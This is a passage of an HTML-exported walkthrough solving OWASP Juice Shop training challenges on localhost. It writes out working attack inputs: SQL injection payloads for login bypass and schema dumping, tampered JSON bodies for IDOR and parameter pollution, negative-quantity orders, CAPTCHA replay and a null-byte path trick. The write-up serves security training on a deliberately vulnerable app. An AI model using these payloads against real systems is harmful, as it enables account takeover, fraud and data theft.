class="">append it with value : <strong>&quot;admin&quot;</strong></p><p id="7ed2a50f-cf21-449b-9f19-e160203f08c4" class="">
+</p><p id="7a4e7403-aa1d-4e17-8e12-1cc035a5eb7d" class="block-color-orange"><mark class="highlight-brown_background">{&quot;email&quot;:&quot;demo@demo.com&quot;,&quot;password&quot;:&quot;12345&quot;,&quot;passwordRepeat&quot;:&quot;12345&quot;,</mark> 
+<mark class="highlight-red"><strong>&quot;role&quot;:&quot;customer&quot;</strong></mark> ,<mark class="highlight-brown_background">&quot;securityQuestion&quot;:{&quot;id&quot;:9,&quot;question&quot;:&quot;Your ZIP/postal code when you were a teenager?&quot;,&quot;createdAt&quot;:&quot;2019-10-13T06:02:00.790Z&quot;,&quot;updatedAt&quot;:&quot;2019-10-13T06:02:00.790Z&quot;},&quot;securityAnswer&quot;:&quot;431005&quot;}</mark></p><p id="c30fa244-3f96-4a9b-9cde-07e7fe3293e5" class="">
+</p><h2 id="a6245178-557b-4628-8893-f725c461a6ed" class="">4 - Bjoern&#x27;s Favorite Pet</h2><p id="7c4e7af2-0629-4137-9242-999d6b1b649b" class="">Reset the password of Bjoern&#x27;s OWASP account via the Forgot Password mechanism with the original answer to his security question.</p><p id="69de4151-43b9-407a-9272-469d1f45b4ed" class="">
+</p><p id="ec16ab80-dccc-4017-9268-f472c731f997" class="">This conference talk recording immediately dives into a demo of the Juice Shop application in which Bjoern starts registering a new account 3:59 into the video (<a href="https://youtu.be/Lu0-kDdtVf4?t=239">https://youtu.be/Lu0-kDdtVf4?t=239</a>)</p><pre id="58cb30c7-a936-4ca2-aa92-d200b95e933d" class="code"><code>Zaya</code></pre><p id="5579dfcc-80e5-4f19-8e80-6617f87983b4" class="">
+</p><p id="883be824-16f7-4fd9-a48c-44b1381534dc" class="">
+</p><h2 id="e667d716-1dfa-490a-999f-0a8d9ca961ce" class="">5 - Forged Feedback</h2><p id="e66c81fc-fd27-4536-a84b-e79c856bd095" class="">Post some feedback in another users name.</p><ul id="0562d606-2065-496a-b2e9-b250b28139c1" class="bulleted-list"><li>In this we need to intercept the request send from browser to server in burpsuite </li></ul><p id="4573b59a-8e33-4d57-83f9-48026f4b6efc" class="">on following endpoint</p><p id="c5f152e2-4154-47e3-8b99-a4a3680cfa6c" class=""><a href="http://localhost:3000/api/Feedbacks/">http://localhost:3000/api/Feedbacks/</a></p><p id="de4edeb5-1dc8-4c81-9d80-8a61bcfb4a1f" class="">where when we click on submit following POST request is send</p><p id="495538cc-3851-4417-b818-343f6a23dd90" class="">
+</p><p id="958a744a-de1d-4e58-ba89-e5d623a426cd" class=""><mark class="highlight-orange">{&quot;UserId&quot;:16,&quot;captchaId&quot;:16,&quot;captcha&quot;:&quot;51&quot;,&quot;comment&quot;:&quot;testing,&quot;rating&quot;:2}</mark></p><p id="e72a448d-062a-42e1-8049-20c660e749ed" class="">here we can simply replace the UserId parameter with another UserId which will make following request as following.</p><p id="d3ab8d48-dd39-4a72-8320-f9f15bdf96a9" class=""><mark class="highlight-orange">{&quot;UserId&quot;:</mark><strong><mark class="highlight-red">14</mark></strong><mark class="highlight-orange">,&quot;captchaId&quot;:16,&quot;captcha&quot;:&quot;51&quot;,&quot;comment&quot;:&quot;testing,&quot;rating&quot;:2}</mark></p><p id="7682e328-5793-4462-a9bb-2e68cfa0dca0" class="">
+</p><p id="176bab90-49c3-4a2a-af8f-bd8d0b48ee25" class="">
+</p><h2 id="3ff63d96-b6a2-4c4d-a5c0-cf4e8cc55907" class="">6 - Forged Review</h2><p id="e87f17ae-eda9-49be-828b-e0893ad4a4f9" class="">Post a product review as another user or edit any user&#x27;s existing review.</p><ul id="14745fcd-f70b-4b77-87fd-2c6aabc83c1b" class="bulleted-list"><li>In this we need to intercept the request send from browser to server in burpsuite </li></ul><p id="fa64134a-2d03-4a2d-ae86-5e84c848322f" class="">on following endpoint</p><p id="837aacc3-9dc8-4412-a044-d7d0ab133a18" class=""><a href="http://localhost:3000/rest/products/1/reviews">http://localhost:3000/rest/products/1/reviews</a></p><p id="4eed9cc2-816b-4c40-b94e-2352476436dd" class="">where when we click on submit following POST request is send</p><p id="1baed5e2-61a1-409a-94b6-8d9960a37d4e" class="">
+</p><p id="e5bc3aa8-7376-4320-895f-4d29b26e3c4d" class=""><mark class="highlight-orange">{&quot;message&quot;:&quot;this is awesome </mark><mark class="highlight-orange"><a href="mailto:product%22,%22author%22:%22testinglikepro@gmail.com">product&quot;,</a></mark><strong><mark class="highlight-red"><a href="mailto:product%22,%22author%22:%22testinglikepro@gmail.com">&quot;author&quot;:&quot;testinglikepro@gmail.com</a></mark></strong><strong><mark class="highlight-red">&quot;</mark></strong><mark class="highlight-orange">}</mark></p><p id="2354c93c-fbc0-497a-972f-47e6f0142a4c" class="">here we can simply replace the author parameter with another author email which will make following request as following.</p><p id="2591f04b-6d93-44fa-8c39-6843db702ccd" class=""><mark class="highlight-orange">{&quot;message&quot;:&quot;this is awesome </mark><mark class="highlight-orange"><a href="mailto:product%22,%22author%22:%22testinglikepro@gmail.com">product&quot;,</a></mark><mark class="highlight-red"><strong><a href="mailto:product%22,%22author%22:%22testinglikepro@gmail.com">&quot;author&quot;:&quot;</a></strong></mark><mark class="highlight-red"><strong>demo@demo.com&quot;</strong></mark><mark class="highlight-orange">}</mark></p><h2 id="e706cfd7-7125-4ca8-a2c5-7b7fc020a287" class="">7 - Manipulate Basket</h2><p id="b2b8e35d-8e18-4b2d-9d97-589fba35b96b" class="">Put an additional product into another user&#x27;s shopping basket.</p><ul id="9bd287b4-b379-4902-95fe-67d7cda27c1f" class="bulleted-list"><li>When you add a product to your basket a following POST request is being send.</li></ul><p id="b88f826f-b9ff-446c-8ad3-399a6d9a7732" class="">
+</p><p id="7f4d40e5-1b9d-446a-9705-f2d7b4da57ad" class=""><a href="http://localhost:3000/api/BasketItems/">http://localhost:3000/api/BasketItems/</a></p><p id="0428cb36-fe17-46a4-a27f-3b2322ec5b83" class="">with your Authorisation bearer</p><p id="9235c509-9299-40b3-a68f-e699c28e2bee" class="">(lets assume your <strong>&quot;BasketId&quot;:&quot;14&quot;</strong> , and victims <strong>&quot;BasketId&quot;:&quot;15&quot;</strong> )</p><p id="599aec6a-fcf9-44a6-a698-8ef3d27314cb" class="">the request will be like this.</p><p id="70815d72-c4fb-421f-a259-72d9aa8e6d11" class="">{&quot;ProductId&quot;:22,<mark class="highlight-red">&quot;BasketId&quot;:&quot;14&quot;,</mark>&quot;quantity&quot;:1}  //normal</p><p id="40ae87a3-4c89-4bee-bc77-7c83ac3d68c5" class="">
+</p><p id="1c9240a5-2ebc-4ee9-84b2-9f9ba3d6ff97" class="">{&quot;ProductId&quot;:22,<mark class="highlight-red">&quot;BasketId&quot;:&quot;15&quot;,</mark>&quot;quantity&quot;:1}  //manipulated</p><p id="b7ff12cc-9956-49ac-ad5d-fc6d43def6ce" class="">but we get error as invalid BucketId</p><p id="9ebd64f9-f4ca-4a46-9c52-84f6ce78a66f" class="">
+</p><p id="8c53465f-59c8-4c4b-ad79-efe86a437d33" class="">here comes the <strong>HTTP parameter pollution attack</strong></p><p id="9297457a-2811-4be9-a7e7-e1d5230e555f" class="">&quot;ProductId&quot;:22,<mark class="highlight-red">&quot;BasketId&quot;:&quot;15&quot;,</mark>&quot;quantity&quot;:1,<mark class="highlight-red">&quot;BasketId&quot;:&quot;13&quot;</mark>} </p><p id="9cb2ff09-d48f-4077-80db-e72c6732bbe4" class="">and here you win.</p><p id="adf9df3b-d2d0-4905-9bd0-4a2fe57c2f5e" class="">
+</p><h2 id="244740ba-967d-49c5-aa34-d993fd211331" class="">8 - Payback Time</h2><p id="2f8a60d2-bc0e-442f-acad-f5385df1955b" class="">Place an order that makes you rich.</p><p id="814df6c1-3013-4d4c-add8-70eb46e29309" class="">Here goal is to make a basket <strong>quantity in a negative value</strong>.</p><p id="09a288ee-6cc0-4616-abae-7b6643c9c527" class="">
+</p><ol id="16970e7a-d2b5-4e5d-8f26-77db8684ae1a" class="numbered-list" start="1"><li>Log in as any user.</li></ol><ol id="d104d660-f9bf-436e-9e67-b6ef9b46f40e" class="numbered-list" start="2"><li>Put at least one item into your shopping basket.</li></ol><ol id="ad5a4fbd-f6d0-4fe3-921b-19b622547d59" class="numbered-list" start="3"><li>Note that reducing the quantity of a basket item below 1 is not possible via the UI</li></ol><ol id="2593dd6e-2d73-42c3-8926-103933134766" class="numbered-list" start="4"><li>When changing the quantity via the UI, you will notice <code>PUT</code> requests to <a href="http://localhost:3000/api/BasketItems/%7Bid%7D">http://localhost:3000/api/BasketItems/{id}</a> in the Network tab of your DevTools</li></ol><ol id="9e3f8194-ccdd-4723-a0c1-55357ebd9242" class="numbered-list" start="5"><li>Memorize the <code>{id}</code> of any item in your basket</li></ol><ol id="49c502b6-adda-4db8-8323-dbf1e8f886f1" class="numbered-list" start="6"><li>Copy your <code>Authorization</code> header from any HTTP request submitted via browser.</li></ol><ol id="6e6bbad3-d549-4d1b-8ee4-339bf11c6de2" class="numbered-list" start="7"><li>Submit a <code>PUT</code> request to <a href="http://localhost:3000/api/BasketItems/%7Bid%7D">http://localhost:3000/api/BasketItems/{id}</a> replacing <code>{id}</code> with the memorized number from 5. and with:<ul id="19779433-9a9c-4076-a72b-fea9fe4aa57f" class="bulleted-list"><li><code>{&quot;quantity&quot;: -100}</code> as body,</li></ul><ul id="5e1b5eb3-8421-4c01-969c-e160a234815a" class="bulleted-list"><li><code>application/json</code> as <code>Content-Type</code></li></ul><ul id="f1f15c90-afeb-4105-9568-8e731bb15685" class="bulleted-list"><li>and <code>Bearer ?</code> as <code>Authorization</code> header, replacing the <code>?</code> with the token you copied from the browser.</li></ul></li></ol><ol id="30131eff-3a9e-4e4c-9d6d-b96bce6558f4" class="numbered-list" start="8"><li>Continue Proceed and Click Checkout to issue the negative order and solve this challenge.</li></ol><p id="7db9008d-02c2-467b-8e89-108ae6bb3384" class="">
+</p><p id="71036b11-1727-48b5-a1bd-5fc695518e6d" class="">
+</p><h2 id="b6f087ea-1873-48c4-9535-43042cd8509c" class="">9 - CAPTCHA Bypass</h2><p id="3f7e2ea9-c8f7-4473-8c43-74fb9057e03a" class="">Submit 10 or more customer feedbacks within 10 seconds.</p><p id="29761e40-88ba-4bae-88e5-ffa47562e4b9" class="">This is simple send same 10 requests with same captcha value and id</p><p id="9fe3c461-d8b7-46c8-a840-e98c8a44bf7e" class="">eg :- </p><p id="1df9e209-8365-46d6-81ef-52f52d926ff7" class="">
+</p><ol id="1ce7e790-56b4-4fe6-812a-22f5a6b7c564" class="numbered-list" start="1"><li>Submit a <code>POST</code> request to <a href="http://localhost:3000/api/Feedbacks">http://localhost:3000/api/Feedbacks</a> <ul id="1ae7cb7d-c29f-439b-bedb-e3265cb5c759" class="bulleted-list"><li><mark class="highlight-gray_background">{&quot;UserId&quot;:36,&quot;captchaId&quot;:20,&quot;captcha&quot;:&quot;-29&quot;,&quot;comment&quot;:&quot;thisisgreat&quot;,&quot;rating&quot;:1}</mark> as body,</li></ul><ul id="007aa39a-e55d-429c-8237-9a8710b8f10e" class="bulleted-list"><li><code>application/json</code> as <code>Content-Type</code></li></ul><ul id="3e525964-31ad-4fc4-a225-1e41bb146e27" class="bulleted-list"><li>and <code>Bearer ?</code> as <code>Authorization</code> header, replacing the <code>?</code> with the token you copied from the browser.<p id="238bd3e5-ae22-45a5-a871-a0b8c62d4c89" class="">use the same post request 10 times using any script or manual.</p></li></ul></li></ol><p id="be7f4193-dc19-48f5-8b70-b4becd898ac4" class="">
+</p><h2 id="35b295a7-5583-40cb-bc0b-8995d2ad05d3" class="">10 - Product Tampering</h2><p id="cc6f23ae-225f-4651-b32d-a7cb90f48df0" class="">Change the href of the link within the OWASP SSL Advanced Forensic Tool (O-Saft) product description into <a href="https://owasp.slack.com/">https://owasp.slack.com</a>.</p><p id="ff602402-55b5-4961-a92a-c5372b36c9a1" class="">
+</p><ol id="788d26ea-6c12-4d75-bfad-15a1d1a4ea3a" class="numbered-list" start="1"><li>Submit a <code>PUT</code> request to <a href="http://localhost:3000/api/Products/9">http://localhost:3000/api/Products/9</a><ul id="356676f1-a0a1-4579-a81e-214f32f2350a" class="bulleted-list"><li>{&quot;description&quot;:&quot;&lt;a href=\&quot;<a href="https://owasp.slack.com/">https://owasp.slack.com</a>\&quot; target=\&quot;_blank\&quot;&gt;More...&lt;/a&gt;&quot;} as body,</li></ul><ul id="80b8a772-5446-4b9e-ab1d-dd949f478c9f" class="bulleted-list"><li><code>application/json</code> as <code>Content-Type</code></li></ul><ul id="c2d94ddd-76e9-4b16-b022-6069d8a88239" class="bulleted-list"><li>and <code>Bearer ?</code> as <code>Authorization</code> header, replacing the <code>?</code> with the token you copied from the browser.<p id="5e23c167-8856-4e84-b363-cbb83883c8aa" class="">
+</p></li></ul></li></ol><h2 id="b56ceeef-250b-4e9f-8905-014f26233c57" class="">11 - Privacy Policy Inspection</h2><p id="32602a88-07ec-49ef-97cf-a76f647f14e5" class="">Prove that you actually read our privacy policy.</p><ol id="e6bbc802-26a4-431c-9893-97afa69ce123" class="numbered-list" start="1"><li>Open <a href="http://localhost:3000/#/privacy-security/privacy-policy">http://localhost:3000/#/privacy-security/privacy-policy</a>.</li></ol><ol id="e7486132-9a39-4639-bc17-6ec7cc5dea10" class="numbered-list" start="2"><li>Moving your mouse cursor over each paragraph will make a fire-effect appear on certain words or partial sentences.</li></ol><ol id="89465820-4bf4-452a-b6b7-a005ed6b2eb5" class="numbered-list" start="3"><li>spect the HTML in your browser and note down all text inside <code>&lt;span class=&quot;hot&quot;&gt;</code> tags, which are <code>http://localhost</code>, <code>We may also</code>, <code>instruct you</code>, <code>to refuse all</code>, <code>reasonably necessary</code> and <code>responsibility</code>.</li></ol><ol id="da598052-a522-4d6f-97d8-379727cc1e7d" class="numbered-list" start="4"><li>Combine those into the URL <a href="http://localhost:3000/we/may/also/instruct/you/to/refuse/all/reasonably/necessary/responsibility">http://localhost:3000/we/may/also/instruct/you/to/refuse/all/reasonably/necessary/responsibility</a> (adding the server port if needed) and solve the challenge by visiting it.</li></ol><p id="628154f2-628f-4c1e-bc5c-148b6d0ee4a2" class="">It seems the Juice Shop team did not appreciate your extensive reading effort enough to provide even a tiny gratification, as you will receive only a <code>404 Error: ENOENT: no such file or directory, stat &#x27;/app/frontend/dist/frontend/assets/private/thank-you.jpg&#x27;</code>.</p><p id="6802ba9d-efec-47ad-ad75-8ecd8a722cfb" class="">
+</p><h2 id="227e20ee-81fc-469c-b60e-219161d3e105" class="">12 - Login Jim</h2><p id="984c5dcb-62b6-4fc4-800f-57e86d96b19d" class="">
+</p><p id="beef4da5-23ce-4a2c-b41d-2da1bdcdaa12" class="">Log in with Jim&#x27;s user account.</p><p id="4bca353c-2a4b-4636-bd3a-45a3808242b4" class="">
+</p><ul id="65cbcca7-3890-4fc1-a8ca-70ace4cf433c" class="bulleted-list"><li>Log in with <em>Email</em> <code>jim@juice-sh.op&#x27;--</code> and any <em>Password</em> if you already know the email address of Jim.</li></ul><ul id="a133ad88-8517-46ec-8ac6-1d1a3de5169c" class="bulleted-list"><li>or log in with <em>Email</em> <code>jim@juice-sh.op</code> and <em>Password</em> <code>ncc-1701</code> if you looked up Jim&#x27;s password hash in a rainbow table after harvesting the user data as described in <a href="https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/appendix/solutions.html#retrieve-a-list-of-all-user-credentials-via-sql-injection">Retrieve a list of all user credentials via SQL Injection</a>.</li></ul><p id="31d46ecc-f4e0-420a-9384-21e3399719e7" class="">
+</p><h2 id="7de27942-48c9-4f1e-8137-ed14bf8c1fb7" class="">13 - Reset Jim&#x27;s Password</h2><p id="4b26ede7-c4b5-4704-9811-6b1a4ff8b0e4" class="">Reset Jim&#x27;s password via the Forgot Password mechanism with the original answer to his security question.</p><p id="8dd227fc-c414-4059-9382-8dc879449620" class="">
+</p><p id="f3fa057e-c95f-4518-8930-b8d0607c0551" class="">Visit <a href="http://localhost:3000/#/forgot-password">http://localhost:3000/#/forgot-password</a> and provide jim@juice-sh.op as your Email to learn that Your eldest siblings middle name? is Jim&#x27;s chosen security question</p><ul id="1478d2c3-0b73-4698-8871-a5d899a6ace6" class="toggle"><li><details open=""><summary>look for all products reviews  </summary></details></li></ul><p id="0e38bfa4-173b-480b-8c07-5156e3b90f38" class="">
+</p><ul id="c6cd09ce-383f-4e4a-b932-ab75b0323050" class="bulleted-list"><li>A product review for the <em>OWASP Juice Shop-CTF Velcro Patch</em> stating <em>&quot;Looks so much better on my uniform than the boring Starfleet symbol.&quot;</em></li></ul><ul id="73d2f4c6-4da7-4208-8fc2-d06f717c26a0" class="bulleted-list"><li>Another product review <em>&quot;Fresh out of a replicator.&quot;</em> on the <em>Green Smoothie</em> product</li></ul><ul id="87c669df-01fc-48c3-8c6e-42a87f1bba0c" class="toggle"><li><details open=""><summary>google <strong>&quot;Jim Starfleet&quot; </strong></summary></details></li></ul><p id="471f8bdf-bb72-438d-b41a-20f00dc540d1" class="">now look for siblings the name is : <strong>&quot;Samuel&quot;</strong></p><p id="0ccf51c8-87db-4086-8c8d-f0d93bb23b58" class="">
+</p><h2 id="622bc5a1-074b-4c0d-9cef-2d785a8837ca" class="">14 - Upload Size</h2><p id="4f4c6302-926e-4f58-bfbb-0e41eed870f8" class="">Upload a file larger than 100 kB, but less than 200kB</p><p id="32ce0dc5-626c-48cd-b080-625d92b5c710" class="">
+</p><ol id="57c18711-a54e-4674-b6e2-17c6f8fcb8b0" class="numbered-list" start="1"><li>The client-side validation prevents uploads larger than 100 kB.</li></ol><ol id="65531df6-1fd8-4bc2-9d44-de787f763d88" class="numbered-list" start="2"><li>Craft a <code>POST</code> request to <a href="http://localhost:3000/file-upload">http://localhost:3000/file-upload</a> with a form parameter <code>file</code> that contains a PDF file of more than 100 kB but less than 200 kB.</li></ol><ol id="60196106-6a3e-475c-8d5f-164a0ab00b5d" class="numbered-list" start="3"><li>The response from the server will be a <code>204</code> with no content, but the challenge will be successfully solved.</li></ol><p id="23723f2b-cf4b-41e3-8d90-742d9c00e328" class="">Files larger than 200 kB are rejected by an upload size check on server side with a <code>500</code> error stating <code>Error: File too large</code>.</p><p id="1586652c-02cc-42b5-808c-638b3af2d7ca" class="">
+</p><p id="0b558cfd-4708-4b35-af75-db980c026d35" class="">
+</p><h2 id="5376d2b1-70ab-4581-b4bd-7d0c3ff67327" class="">15 - Upload a file that has no .pdf or .zip extension</h2><p id="9731c218-734f-4e62-9264-eee6f098295e" class="">Upload a  file larger than 100 kB, but less than 200kB with any extension other than .pdf, .zip to solve this. </p><p id="2c5292fd-a2bc-423e-bd80-6f8f79057bc9" class="">
+</p><ol id="201bb13f-b5a6-4a5d-a995-0b2866627b38" class="numbered-list" start="1"><li>Craft a <code>POST</code> request to <a href="http://localhost:3000/file-upload">http://localhost:3000/file-upload</a> with a form parameter <code>file</code> that contains a PDF file of more than 100 kB but less than 200 kB with any other extension other than .pdf and .zip</li></ol><ol id="d4775eb8-7978-4d66-a172-91e9f2fa876d" class="numbered-list" start="2"><li>The response from the server will be a <code>204</code> with no content, but the challenge will be successfully solved.</li></ol><p id="8ffb58a7-9e6f-46ef-a6d4-f6004f68f1f3" class="">
+</p><h2 id="d45f3eed-69c5-4d5b-a823-9048352995da" class="">16 -  Login Amy </h2><p id="2b5394ab-9fa9-427a-b369-7f8ac06cb260" class="">Log in with Amy&#x27;s original user credentials</p><p id="873d1b51-686c-4e27-a7f0-8f6b8bb6110f" class="">Log in with Amy&#x27;s original user credentials. (This could take 93.83 billion trillion trillion centuries to brute force, but luckily she did not read the &quot;One Important Final Note&quot;)</p><p id="49b55b74-ad6c-42e4-9bb5-acfa60619d56" class="">
+</p><ol id="a99263af-4198-4e95-84be-0be85bdd982a" class="numbered-list" start="1"><li>Google for either <code>93.83 billion trillion trillion centuries</code> or <code>One Important Final Note</code>.</li></ol><ol id="dfd4c947-e164-4d83-8962-b05cf57afca1" class="numbered-list" start="2"><li>Both searches should show <a href="https://www.grc.com/haystack.htm">https://www.grc.com/haystack.htm</a> as one of the top hits.</li></ol><ol id="eb4bfb1b-fc59-4524-98e2-f4fe266fcc8b" class="numbered-list" start="3"><li>After reading up on <em>Password Padding</em> try the example password <code>D0g.....................</code></li></ol><ol id="0e5b902e-838c-428a-a227-3ca920dba382" class="numbered-list" start="4"><li>She actually did a very similar padding trick, just with the name of her husband <em>Kif</em> written as <em>K1f</em> instead of <em>D0g</em> from the example! She did not even bother changing the padding length!</li></ol><ol id="5d114218-16a8-49f1-80bf-6eb08f56410a" class="numbered-list" start="5"><li>Visit <a href="http://localhost:3000/#/login">http://localhost:3000/#/login</a> and log in with credentials <code>amy@juice-sh.op</code> and password <code>K1f.....................</code> to solve the challenge</li></ol><p id="f2334dee-e729-4d3c-856d-92a933b8579a" class="">
+</p><h2 id="e44cf629-124e-4a01-a1be-1b40d04b98fd" class="">17 - Database Schema </h2><p id="a5b37eab-2489-43c8-a1e2-c923ab9cbf9e" class="">Exfiltrate the entire DB schema definition via SQL Injection.</p><p id="42034ec5-1b0c-4873-a07d-b9f7e50d7fd7" class="">send a GET request on following endpoint </p><p id="cc1091dd-a516-49a1-b657-2179c67ef845" class=""><a href="http://localhost:3000/rest/products/search?q=">http://localhost:3000/rest/products/search?q=</a>1</p><p id="426e24b3-1616-4cf0-9642-1c49f72223fb" class="">
+</p><pre id="16814f38-9734-4b47-8005-8dc131d25767" class="code"><code>qwert&#x27;)) UNION SELECT sql, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;8&#x27;, &#x27;9&#x27; FROM sqlite_master-- solves the challenge.</code></pre><p id="072e1679-caf2-4a9d-81e3-394966c260f2" class="">
+</p><p id="3e663482-56a3-449d-af94-7a85b3d20791" class="">
+</p><h2 id="631efcd6-a7ce-483b-a356-3d1cdf777125" class="">18 - GDPR Data Erasure</h2><p id="295cd5fe-8f74-4ccd-9dc9-e197fd2b6296" class="">Log in with Chris&#x27; erased user account.</p><ul id="c504a9c9-2dff-426c-9742-d6151de9a764" class="bulleted-list"><li>Log in with <em>Email</em> <code>chris.pike@juice-sh.op&#x27;--</code> and any <em>Password</em> if you already know the email address of Chris.</li></ul><ul id="eb61f13f-5664-4b3e-9c2f-99faaa161c25" class="bulleted-list"><li>or log in with <em>Email</em> as <code>\&#x27; or deletedAt IS NOT NULL--</code> and any <em>Password</em> you like for a &quot;lucky hit&quot; as Chris seems to be the only or at least first ever deleted user. The presence of <code>deletedAt</code> you might have derived from <a href="https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/appendix/solutions.html#retrieve-a-list-of-all-user-credentials-via-sql-injection">Retrieve a list of all user credentials via SQL Injection</a> and enforcing it to be <code>NOT NULL</code> will give you back only users who were soft-deleted at some point of time.</li></ul><p id="bd308839-421b-4c99-82fe-b217b56b2b1f" class="">
+</p><h2 id="38491ac0-7b2b-41de-bf42-f584bafe7493" class="">19 - Login Bender</h2><p id="b6d42c2f-9942-455b-903b-944f57c80d8e" class="">Log in with Bender&#x27;s user account.</p><p id="3f1609fb-aca9-4582-a9e1-cc31e8005f2e" class="">
+</p><p id="4a9f780e-992c-40f2-bdeb-9b0ead568011" class="">Log in with Email <mark class="highlight-red">bender@juice-sh.op&#x27;--</mark> and any Password if you already know the email address of Bender.</p><p id="8a01a0fe-8db0-418e-bf52-347e6bf367c7" class="">
+</p><p id="326d034b-63e2-462f-8f29-7b3864a9cfe7" class="">
+</p><p id="f2256cf6-33b0-4793-86a9-6c05b2fc2980" class="">
+</p><p id="a9e3d360-3359-46c3-9a8a-0b899a94be1f" class="">—   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   </p><h1 id="8cfb9e48-575f-4387-8a25-4f2691bcb5a6" class="">LEVEL -4   </h1><p id="2b89e792-7502-4c8a-b581-3ed3ec36b936" class="">—-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  —— —   —-  </p><p id="1445e0e5-0566-4794-8d2c-acdc259bb0c2" class="">
+</p><h2 id="b7c12c2a-51d8-4475-90f9-c6a5e3e2fc46" class="">1 - Access Log</h2><p id="af43b9ff-4457-4f7b-a0ff-6f571d164aeb" class="">Gain access to any access log file of the server.</p><ul id="b12aee8d-5709-46c5-96c7-bb9438f1c712" class="toggle"><li><details open=""><summary>recon can make you win in this challenge</summary></details></li></ul><p id="baf2f71d-1d32-4cfb-9527-b5a0620e8e4d" class=""> </p><ol id="ae88aec9-b450-4425-9d95-095464f32c8f" class="numbered-list" start="1"><li>Following <a href="https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/part2/sensitive-data-exposure.html#gain-access-to-any-access-log-file-of-the-server">the hint to drill down deeper than one level</a>, you will at some point end up with <a href="http://localhost:3000/support/logs">http://localhost:3000/support/logs</a>.</li></ol><ol id="6adb7ff8-408b-4445-85a8-e457827bb6c0" class="numbered-list" start="2"><li>Inside you will find at least one <code>access.log</code> of the current day. Open or download it to solve this challenge.</li></ol><p id="bd468c18-b50b-4886-8fd4-6849c01b73f3" class="">
+</p><p id="300968aa-65ec-44aa-83e9-2103f273a2cd" class="">
+</p><h2 id="ed821795-9f92-4b28-8266-66f894c8a3a8" class="">2 - Christmas Special</h2><p id="c4887c8f-7ed5-4c44-8329-234d35e1bac5" class="">Order the Christmas special offer of 2014.</p><p id="8e6dc1d9-b9f6-43d5-9673-6457c4a4f9bd" class="">
+</p><p id="92c9ce47-f515-4eea-96d2-a02c7d710781" class="">do a GET request on the following endpoint</p><p id="213944b6-4142-41ed-85d2-61c4f0e54af9" class=""><a href="http://localhost:3000/rest/products/search?q=%27">http://localhost:3000/rest/products/search?q=</a></p><p id="374c5d15-2aea-42ab-bdff-38b155333987" class="">just to execute sql statement or fix query we do following in URL</p><pre id="fc4a2984-6e2d-4aec-ab62-ca27a738fc22" class="code"><code>http://localhost:3000/rest/products/search?q=&#x27;)) --+</code></pre><p id="366da357-ca45-4b81-bdb1-ce120e71a16d" class="">
+</p><pre id="f72caa4c-2e41-4e1b-81a1-339834d9cac4" class="code"><code>&#x27;)) to close the query is SQLlite and --+ to comment remaining </code></pre><p id="51a214b3-3d81-45a2-abb7-e83d526fc4fe" class="">
+</p><p id="f1cdea1a-2857-49f2-b530-c8f72546255f" class="">now you get id response for Christmas offer id i.e <strong>10</strong></p><pre id="e5d73036-a25d-4193-bddd-80682bb21280" class="code"><code>{
+id	10,
+name	&quot;Christmas Super-Surprise-Box (2014 Edition)&quot;,
+description	&quot;Contains a random selection of 10 bottles (each 500ml) of our tastiest juices and an extra fan shirt for an unbeatable price! (Seasonal special offer! Limited availability!)&quot;,
+price	29.99,
+deluxePrice	29.99,
+image	&quot;undefined.jpg&quot;,
+createdAt	&quot;2019-10-13 06:02:02.907 +00:00&quot;,
+updatedAt	&quot;2019-10-13 06:02:02.907 +00:00&quot;,
+deletedAt	&quot;2014-12-27 00:00:00.000 +00:00&quot;,
+}</code></pre><p id="6c9c1f04-eef6-4306-ba20-7894849ab68c" class="">now use the Product id while purchasing <strong>id:10 </strong>to solve this challenge.</p><pre id="6fcca74a-f2bf-4fe8-80e8-32752955191b" class="code"><code>{&quot;ProductId&quot;:10,&quot;BasketId&quot;:&quot;20&quot;,&quot;quantity&quot;:1}</code></pre><p id="d7bbf838-0bff-43aa-a485-ba0ca190ed7d" class="">
+</p><h2 id="5bcfa450-ddea-4c40-9891-7fd2fd79a568" class="">3 -  Leaked Unsafe Product</h2><p id="4bfc0fdd-08a5-4158-9187-b8ecddbbdf44" class="">Identify an unsafe product that was removed from the shop and inform the shop which ingredients are dangerous.</p><p id="befe89f0-4fd3-4bdb-b825-2ca59d0f8e26" class="">Submit a comment containing both <strong>Eurogium Edule</strong> and <strong>Hueteroneel</strong> via </p><p id="2ecc5810-5bdd-4153-84df-053aaaf99606" class=""><code>http://localhost:3000/#/contact 
+</code>to solve this challenge</p><p id="a22ee41c-ecda-4e54-9d71-2ef08e120d0f" class="">
+</p><h2 id="b556d2ed-e091-4176-a37b-268974900f3d" class="">4 - Easter Egg</h2><p id="6bd511eb-7d6c-4a2a-9635-c62bdec2f40f" class="">Find the hidden easter egg.</p><p id="c8a479a9-7096-4b69-a005-8ddf3b3f9ede" class="">
+</p><p id="00031bef-95fb-46c1-bb6d-eb08df17b300" class="">1. Use the Poison Null Byte attack described in Access a developer&#x27;s forgotten backup file... </p><p id="fe4ff53c-871a-4bd9-b1c7-3f3e601468bf" class="">2. ...to download <code><a href="http://localhost:3000/ftp/eastere.gg%2500.md">http://localhost:3000/ftp/eastere.gg%2500.md</a></code></p><p id="f1cd1686-b8a6-4d73-b59c-34543fbce93c" class="">Posison <code>NULL BYTE - </code><code><a href="http://localhost:3000/ftp/eastere.gg%2500.md">%2500</a></code></p><p id="03ceaf6a-c8b7-4192-9ec0-045902dcf82c" class="">
+</p><p id="8d12d25c-20ff-43a4-a05b-2f0f4260d1aa" class="">
+</p><h2 id="11436e69-c801-4c75-a1b8-587653ab73fb" class="">5 - Nested Easter Egg</h2><p id="20ab7a0e-d681-450a-a692-c6855d4d518f" class="">Apply some advanced cryptanalysis to find the real easter egg.</p><p id="6e3e4e3b-9652-4461-84ad-986b19d2a611" class="">
+</p><p id="3498fc15-87b9-4490-ab73-c2b6c9c9e6e9" class="">when you open this file downloaded from this.</p><p id="5235e056-a6ce-4c99-bbb9-b247b1753cf4" class=""><code><a href="http://localhost:3000/ftp/eastere.gg%2500.md">http://localhost:3000/ftp/eastere.gg%2500.md</a></code></p><p id="a940adc5-e627-48d7-b1f0-29769b1935cf" class="">
